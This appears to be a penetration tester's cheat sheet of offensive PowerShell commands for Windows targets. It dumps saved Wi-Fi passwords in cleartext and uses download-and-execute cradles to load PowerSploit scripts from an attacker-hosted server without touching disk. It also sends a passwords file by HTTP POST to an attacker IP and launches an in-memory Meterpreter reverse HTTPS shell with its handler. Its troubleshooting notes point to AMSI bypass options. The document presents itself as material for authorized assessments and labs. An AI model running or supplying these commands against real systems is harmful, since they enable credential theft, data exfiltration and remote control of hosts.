# Launch and Execution Policy

## Overview

Bypass execution policy for the current process when loading scripts from disk or memory.

## Commands

From cmd.exe:
    powershell -nop -exec bypass

File types:
    .ps1   script
    .psd1  script data
    .psm1  script module

    Get-ExecutionPolicy -List
    Set-ExecutionPolicy Bypass -Scope Process

# Wi-Fi Passwords

## Overview

Extract saved wireless profile passwords on a Windows host (authorized assessments only).

## Commands

    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize


# Remote Load

## Overview

Host scripts from the attack machine and load into target PowerShell without writing to disk (or save locally first).

Attack host:
    cd /opt/PowerSploit/Recon/
    python3 -m http.server 80

Download to disk, then import:
    powershell -nop -exec bypass
    iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1 -OutFile .\PowerView.ps1
    Import-Module .\PowerView.ps1
    Get-NetLocalGroup

Execute in memory:
    powershell -nop -exec bypass
    iex (iwr -UseBasicParsing http://<attacker IP>/PowerView.ps1); Get-NetLocalGroup

Upload data via HTTP POST:
    powershell -nop -exec bypass
    iex "(New-Object Net.WebClient).UploadString('http://<attacker IP>/passwords.txt','<PostDATA>')"


# Invoke-Shellcode

## Overview

In-memory Meterpreter via PowerSploit Invoke-Shellcode. Verify payload and handler settings before relying on this in a lab.

## Commands

Handler (msfconsole):
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lhost <attacker IP>
    set lport 443
    exploit -j

Attack host:
    cd /opt/PowerSploit/CodeExecution/
    python3 -m http.server 80

Target:
    powershell -nop -exec bypass
    IEX "(New-Object Net.WebClient).DownloadString('http://<attacker IP>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <attacker IP> -Lport 443 -Force"


# Validation / False Positives

iwr without -UseBasicParsing can fail on Windows Server Core or older hosts; add the flag for compatibility.
AMSI may block iex of known PowerSploit signatures; see windows-privesc.txt for bypass options before loading.
Invoke-Shellcode requires matching handler payload/arch; silent failure often means wrong LHOST/LPORT or blocked egress.
Get-Process -IncludeUserName needs elevation to show other users' process owners.
